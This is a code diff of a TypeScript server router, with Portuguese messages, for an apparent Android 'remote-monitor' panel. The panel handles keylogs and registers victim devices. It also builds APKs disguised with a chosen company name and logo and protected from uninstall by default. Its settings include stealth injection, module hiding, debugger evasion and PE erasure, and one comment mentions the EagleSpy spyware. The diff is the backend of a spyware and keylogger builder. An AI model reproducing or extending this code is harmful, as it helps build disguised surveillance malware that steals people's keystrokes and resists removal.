@@ -10,24 +10,19 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
-import { buildSimpleAPK } from './apk-builder-simple';
-import { buildFinalAPKWithApktool } from './apk-builder-final';
-import { buildUltraSimpleAPK } from './apk-builder-ultra-simple';
-import { buildCompleteAPK } from './apk-builder-complete';
-import { buildAPKWithSmaliModification } from './apk-builder-smali-fix';
+import { buildCustomAPK } from "./apk-builder";
+import { generateAPKWrapper } from "./apk-wrapper-generator";
+import { generateSimpleAPKWrapper } from "./apk-wrapper-simple";
+import { buildProfessionalAPK } from "./apk-builder-professional";
+import { buildSimpleProductionAPK } from "./apk-builder-simple-production";
+import { buildAdvancedAPK } from "./apk-builder-advanced";
+import { generateMemoryAPKUrl } from "./apk-builder-memory";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
-
-// Use correct path for both development and production
-const OUTPUT_DIR = process.env.NODE_ENV === 'production'
-  ? '/app/public/apks'
-  : '/home/ubuntu/remote-monitor/public/apks';
 
 export const appRouter = router({
     // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
   system: systemRouter,
-  
-  
   auth: router({
     me: publicProcedure.query(opts => opts.ctx.user),
     login: publicProcedure
@@ -112,48 +107,65 @@ export const appRouter = router({
         return await getEvents();
       }),
   }),
+
   apk: router({
-    testEnv: publicProcedure
-      .query(() => {
-        return {
-          GITHUB_TOKEN: process.env.GITHUB_TOKEN ? 'Present' : 'Missing',
-          GITHUB_REPO_URL: process.env.GITHUB_REPO_URL || 'Missing',
-          NODE_ENV: process.env.NODE_ENV,
-          APP_ENV: process.env.APP_ENV,
-        };
-      }),
     build: publicProcedure
       .input(z.object({
         companyName: z.string().min(1),
         companyUrl: z.string().url(),
         logoUrl: z.string().url().optional(),
+        protectFromUninstall: z.boolean().default(true),
       }))
       .mutation(async ({ input, ctx }) => {
         try {
           console.log('[ROUTER] APK build requested:', { companyName: input.companyName, companyUrl: input.companyUrl });
           
-          // Use SIMPLE builder (sem dependência de EagleSpy)
+          // Use simple production APK builder (reliable and works in production)
           console.log('[ROUTER] Building APK with simple builder...');
-          
-          // Use simple builder - sem dependência de apktool
-          const result = await buildCompleteAPK({
+          const result = await buildSimpleProductionAPK({
             appName: input.companyName,
             appUrl: input.companyUrl,
             logoUrl: input.logoUrl,
           });
           
-          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl });
+          console.log('[ROUTER] Simple builder result:', { success: result.success, downloadUrl: result.downloadUrl, filename: result.filename });
 
           if (!result.success || !result.downloadUrl) {
             throw new Error(result.error || "Erro ao gerar APK");
           }
+
+          // Extract filename from download URL
+          const filename = result.downloadUrl.split('/').pop() || 'app.apk';
+          console.log('[ROUTER] Extracted filename:', filename);
           
-          console.log('[ROUTER] APK generated successfully');
-            
+          // Try to upload to GitHub Releases if token is available
+          let finalDownloadUrl = generateMemoryAPKUrl(input.companyName);
+          if (process.env.GITHUB_TOKEN && result.apkPath) {
+            try {
+              console.log('[ROUTER] Attempting GitHub release upload...');
+              const repoUrl = process.env.GITHUB_REPO_URL || 'https://github.com/user/remote-monitor';
+              const { owner, repo } = parseGitHubUrl(repoUrl);
+              
+              finalDownloadUrl = await uploadToGitHubRelease({
+                owner,
+                repo,
+                token: process.env.GITHUB_TOKEN,
+                appName: input.companyName,
+                filePath: result.apkPath,
+              });
+              
+              console.log('[ROUTER] GitHub release upload successful:', finalDownloadUrl);
+            } catch (githubError) {
+              console.warn('[ROUTER] GitHub release upload failed, using fallback URL:', githubError);
+              // Continue with fallback URL if GitHub upload fails
+            }
+          }
+          
             return {
               success: true,
-              downloadUrl: result.downloadUrl,
-              filename: result.filename || 'app.apk',
+              downloadUrl: finalDownloadUrl,
+              apkPath: result.apkPath,
+              filename: filename,
               message: "APK gerado com sucesso!",
             };
         } catch (error) {
@@ -166,139 +178,163 @@ export const appRouter = router({
       .input(z.object({
         filename: z.string().min(1),
       }))
-      .query(async ({ input, ctx }) => {
+      .query(async ({ input }) => {
         try {
           console.log('[APK] Download requested for:', input.filename);
-          const filePath = path.join(process.cwd(), 'public', 'apks', input.filename);
           
-          if (!fs.existsSync(filePath)) {
-            throw new Error('Arquivo não encontrado');
+          if (input.filename.includes('..') || input.filename.includes('/')) {
+            throw new Error('Invalid filename');
           }
           
-          // Stream file directly via response
-          const stats = fs.statSync(filePath);
+          const apksDir = process.env.NODE_ENV === 'production'
+            ? '/app/public/apks'
+            : path.join(process.cwd(), 'public/apks');
           
-          ctx.res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-          ctx.res.setHeader('Content-Disposition', `attachment; filename="${input.filename}"`);
-          ctx.res.setHeader('Content-Length', stats.size);
-          ctx.res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-          ctx.res.setHeader('Pragma', 'no-cache');
-          ctx.res.setHeader('Expires', '0');
-          ctx.res.setHeader('X-Bypass-Auth', 'true');
-          ctx.res.setHeader('Content-Transfer-Encoding', 'binary');
+          console.log('[APK] APKs directory:', apksDir);
+          console.log('[APK] NODE_ENV:', process.env.NODE_ENV);
           
-          const fileStream = fs.createReadStream(filePath);
-          fileStream.pipe(ctx.res);
+          const filepath = path.join(apksDir, input.filename);
+          console.log('[APK] Full filepath:', filepath);
           
-          // Return empty response - file is streamed directly
-          return { success: true, message: 'File streaming' };
+          if (!fs.existsSync(apksDir)) {
+            console.error('[APK] APKs directory does not exist:', apksDir);
+            throw new Error(`APKs directory not found: ${apksDir}`);
+          }
+          
+          const filesInDir = fs.readdirSync(apksDir);
+          console.log('[APK] Files in directory:', filesInDir);
+          
+          if (!fs.existsSync(filepath)) {
+            throw new Error(`APK file not found at ${filepath}`);
+          }
+          
+          const fileBuffer = fs.readFileSync(filepath);
+          const base64 = fileBuffer.toString('base64');
+          
+          return {
+            success: true,
+            filename: input.filename,
+            data: base64,
+            size: fileBuffer.length,
+          };
         } catch (error) {
           console.error('[APK] Download error:', error);
           throw new Error(`Erro ao baixar APK: ${error instanceof Error ? error.message : String(error)}`);
         }
       }),
   }),
-  
+
   settings: router({
-    save: publicProcedure
+    save: protectedProcedure
       .input(z.object({
         processName: z.string().optional(),
         modulePath: z.string().optional(),
-        hideFromDebugger: z.number().optional(),
         stealthInject: z.number().optional(),
         hideModule: z.number().optional(),
-        erasePE: z.number().optional(),
+        hideFromDebugger: z.number().optional(),
         autoInject: z.number().optional(),
         scramble: z.number().optional(),
+        erasePE: z.number().optional(),
         removeDebugData: z.number().optional(),
         delay: z.number().optional(),
         delayBetween: z.number().optional(),
         injectMethod: z.string().optional(),
       }))
-      .mutation(async ({ input }) => {
-        try {
-          console.log('[SETTINGS] Saving settings:', input);
-          // Aqui você salvaria no banco de dados
-          return {
-            success: true,
-            message: 'Configurações salvas com sucesso',
-            settings: input,
-          };
-        } catch (error) {
-          console.error('[SETTINGS] Save error:', error);
-          throw new Error(`Erro ao salvar configurações: ${error instanceof Error ? error.message : String(error)}`);
+      .mutation(async ({ input, ctx }) => {
+        if (!ctx.user) {
+          throw new TRPCError({ code: 'UNAUTHORIZED' });
         }
+        
+        return await saveSettings(ctx.user.id, input as any);
+      }),
+    
+    get: protectedProcedure
+      .query(async ({ ctx }) => {
+        if (!ctx.user) {
+          throw new TRPCError({ code: 'UNAUTHORIZED' });
+        }
+        
+        return await getSettings(ctx.user.id);
       }),
   }),
-  
+
   monitoring: router({
-    toggleService: publicProcedure
+    toggleService: protectedProcedure
       .input(z.object({
         enabled: z.boolean(),
       }))
-      .mutation(async ({ input }) => {
-        try {
-          console.log('[MONITORING] Toggle service:', input.enabled ? 'ON' : 'OFF');
-          return {
-            success: true,
-            enabled: input.enabled,
-            message: input.enabled ? 'Monitoramento ativado' : 'Monitoramento desativado',
-          };
-        } catch (error) {
-          console.error('[MONITORING] Toggle error:', error);
-          throw new Error(`Erro ao controlar monitoramento: ${error instanceof Error ? error.message : String(error)}`);
+      .mutation(async ({ input, ctx }) => {
+        if (!ctx.user) {
+          throw new TRPCError({ code: 'UNAUTHORIZED' });
         }
+        
+        return {
+          success: true,
+          enabled: input.enabled,
+          message: `MonitoringService ${input.enabled ? 'ativado' : 'desativado'}`,
+        };
       }),
   }),
-  
+
   devices: router({
     register: publicProcedure
       .input(z.object({
-        deviceId: z.string().min(1),
-        deviceName: z.string().min(1),
-        deviceModel: z.string().optional(),
-        osVersion: z.string().optional(),
+        deviceId: z.string(),
+        deviceName: z.string(),
+        deviceModel: z.string(),
+        androidVersion: z.string(),
+        appName: z.string(),
         appUrl: z.string().optional(),
+        appVersion: z.string(),
       }))
       .mutation(async ({ input }) => {
         try {
-          console.log('[DEVICES] Registering device:', input.deviceId, input.deviceName);
+          console.log('[Devices] Registrando dispositivo:', input);
           
-          // Register device in database
-          const result = await registerDevice({
+          const device = await registerDevice({
             deviceId: input.deviceId,
-            appName: input.deviceName,
-            deviceModel: input.deviceModel || 'Unknown',
-            androidVersion: input.osVersion || 'Unknown',
+            userId: 1,
+            appName: input.appName,
             appUrl: input.appUrl || '',
-            userId: 1, // Default user for now
+            deviceModel: input.deviceModel,
+            androidVersion: input.androidVersion,
+            appVersion: input.appVersion,
+            status: 'online',
           });
           
-          console.log('[DEVICES] Device registered successfully:', result);
           return {
             success: true,
+            message: 'Dispositivo registrado com sucesso',
             deviceId: input.deviceId,
-            message: 'Dispositivo registrado com sucesso!',
+            device,
           };
         } catch (error) {
-          console.error('[DEVICES] Registration error:', error);
-          throw new Error(`Erro ao registrar dispositivo: ${error instanceof Error ? error.message : String(error)}`);
+          console.error('[Devices] Erro ao registrar dispositivo:', error);
+          throw new TRPCError({
+            code: 'INTERNAL_SERVER_ERROR',
+            message: 'Erro ao registrar dispositivo',
+          });
         }
       }),
     
-    list: publicProcedure
-      .query(async () => {
+    list: protectedProcedure
+      .query(async ({ ctx }) => {
+        if (!ctx.user) {
+          throw new TRPCError({ code: 'UNAUTHORIZED' });
+        }
+        
         try {
-          console.log('[DEVICES] Listing all devices');
-          const devices = await getDevicesByUser(1); // Default user
-          return {
-            success: true,
-            devices: devices,
-          };
+          const devices = await getDevicesByUser(ctx.user.id);
+          return devices;
         } catch (error) {
-          console.error('[DEVICES] List error:', error);
-          throw new Error(`Erro ao listar dispositivos: ${error instanceof Error ? error.message : String(error)}`);
+          console.error('[Devices] Erro ao listar dispositivos:', error);
+          throw new TRPCError({
+            code: 'INTERNAL_SERVER_ERROR',
+            message: 'Erro ao listar dispositivos',
+          });
         }
       }),
   }),
 });
+
+export type AppRouter = typeof appRouter;
